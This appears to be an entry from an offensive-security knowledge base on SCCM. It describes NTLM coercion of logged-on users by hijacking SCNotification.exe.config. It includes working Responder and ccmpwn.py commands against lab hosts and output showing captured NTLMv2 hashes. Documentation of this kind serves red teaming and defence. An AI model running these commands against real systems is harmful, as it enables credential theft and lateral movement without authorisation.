# COERCE-2

## Description
NTLM coercion of currently logged on users via AppDomainManager injection

## MITRE ATT&CK TTPs
- [T1574.014](https://attack.mitre.org/techniques/T1574/014/) - Hijack Execution Flow

## Requirements
- Administratiive privileges on the SCCM client

## Summary
The CcmExec service executes SCNotification.exe for every user logged onto the SCCM client. Since SCNotification.exe is a .NET application, its configuration file can be modified to point to a .NET assembly on a UNC path, resulting in NTLM authentication coercion.

This technique requires administrative privileges on the SCCM client to overwrite the .NET assembly's configuration file (i.e., `C:\Windows\CCM\SCNotification.exe.config`).

Once the file is overwritten, the CcmExec service can be restarted to trigger the SCNotification.exe to attempt to load the remote assembly from an attacker-controlled server. The authentication can be coerced via SMB or HTTP.

This is automated by CcmPwn's `coerce` command.

Note: Rather than performing coercion, a payload can be uploaded and configured in SCNotification.exe.config to achieve code execution in the user context.

## Impact
This technique provides a method to compromise logged on users through NTLM relay or NetNTLM hash cracking.

## Defensive IDs
Andrew provides defensive considerations in his blog post on this topic. Since these detections are not SCCM-specific, we have not included them in Misconfiguration Manager but they can be found [here](https://web.archive.org/web/20250222182108/https://cloud.google.com/blog/topics/threat-intelligence/windows-session-hijacking-via-ccmexec#:~:text=Defensive%20Considerations).

## Examples
### CcmPwn Coerce
First, setup a listener such as Responder or ntlmrelayx. Here we use Responder:
```
┌──(kali㉿SCCM1-kali)-[~/impacket]
└─$ sudo responder -A -I eth0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

<...SNIP...>

[+] Listening for events...    
```

Next, run `ccmpwn.py` with administrative credentials:
```
┌──(impacket)─(kali㉿SCCM1-kali)-[~/impacket/ccmpwn]
└─$ python3 ccmpwn.py ludus/domainadmin:'password'@10.2.10.11 coerce -computer 10.2.10.99 -method smb
____ ____ _  _ ___  _ _ _ _  _                                                                                                                                                                                                                         
|    |    |\/| |__] | | | |\ |                                                                                                                                                                                                                         
|___ |___ |  | |    |_|_| | \|                                                                                                                                                                                                                                        
v1.0.0                                                                                                                                                               
[*] Downloading original SCNotification.exe.config via SMB
[*] Uploading malicious SCNotification.exe.config via SMB
[*] Stopping CcmExec service. Waiting 20 seconds to restart service.
[*] Starting CcmExec service. Wait around 30 seconds for SCNotification.exe to run config file.
[*] Cleaning up SCNotification.exe.config     
```

Now wait for `ccmpwn.py` to restart the service and capture/relay the incoming NTLM authentication:
```
[SMB] NTLMv2-SSP Client   : 10.2.10.11
[SMB] NTLMv2-SSP Username : ludus\domainadmin
[SMB] NTLMv2-SSP Hash     : domainadmin::ludus:03489dd2ad202a57:6EFA74B3414AD598D2A8EADB735C48CD:01010000000<...SNIP...>030002E0032002E00310030002E00390039000000000000000000                    
[SMB] NTLMv2-SSP Client   : 10.2.10.11
[SMB] NTLMv2-SSP Username : ludus\domainuser
[SMB] NTLMv2-SSP Hash     : domainuser::ludus:5faf4f644ffb9899:5CF9B8944938B83B6BF5BF13019D53B1:010100000000<...SNIP...>030002E0032002E00310030002E00390039000000000000000000   
```

## References
- Andrew Oliveau, [SeeSeeYouExec: Windows Session Hijacking via CcmExec](https://cloud.google.com/blog/topics/threat-intelligence/windows-session-hijacking-via-ccmexec)
- Andrew Oliveau, [ccmpwn](https://github.com/mandiant/ccmpwn)
- lgandx, [Responder](https://github.com/lgandx/Responder)
- Fortra, [ntlmrelayx](https://github.com/fortra/impacket/blob/a63c6522d694a73195e15958734df7de53b43c11/examples/ntlmrelayx.py)